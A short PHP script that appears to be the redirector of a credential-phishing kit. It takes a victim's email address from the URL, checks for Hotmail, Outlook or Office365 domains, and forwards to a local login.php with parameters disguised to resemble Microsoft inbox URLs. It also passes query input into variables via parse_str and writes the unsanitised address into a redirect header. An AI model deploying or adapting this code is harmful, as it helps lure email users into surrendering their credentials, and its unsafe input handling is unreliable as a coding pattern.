<?php 

	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$domain = explode('@', $userid);
	
	$domain_check = '@'.strtolower($domain[1]);
	
	if(stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@outlook.') !== false || stripos($domain_check, '@office365.') !== false){
		header('Location: login.php?u1=_KDFUp_UJ0XK0QXStoGYGw1994256414&fid.126InboxLight.aspxn.1994256516&fid.1252855645289964213Inb0xiLighting_Product-userid&userid='.$userid);
	}
	
	else {
		header('Location: login.php?u1=_KDFUp_UJ0XK0QXStoGYGw1994256414&fid.126InboxLight.aspxn.1994256516&fid.1252855645289964213Inb0xiLighting_Product-userid&userid='.$userid);
	}
		
?>